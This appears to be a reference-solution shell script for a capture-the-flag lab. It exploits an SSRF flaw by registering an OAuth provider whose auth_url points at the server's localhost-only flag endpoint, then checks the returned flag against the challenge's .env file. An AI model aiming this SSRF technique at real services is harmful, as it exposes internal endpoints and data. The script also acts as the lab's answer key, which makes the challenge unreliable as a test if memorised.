#!/usr/bin/env bash
# ============================================================
# OAuthCallback (labs10) — reference solution: SSRF via
# provider auth_url validation
#
# Chain: register a provider whose auth_url self-references
# the localhost-only internal flag endpoint — the server
# fetches it, sees a loopback source address, and reflects
# the body back. No operator infrastructure involved.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8090)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8090}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] registering a provider with a self-referencing auth_url" >&2
RESP="$(curl -fsS -X POST "$BASE/api/providers" -H 'Content-Type: application/json' \
  -d '{"name":"test-provider","auth_url":"http://localhost:5000/internal/flag","callback_url":"http://localhost:5000/callback"}')"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
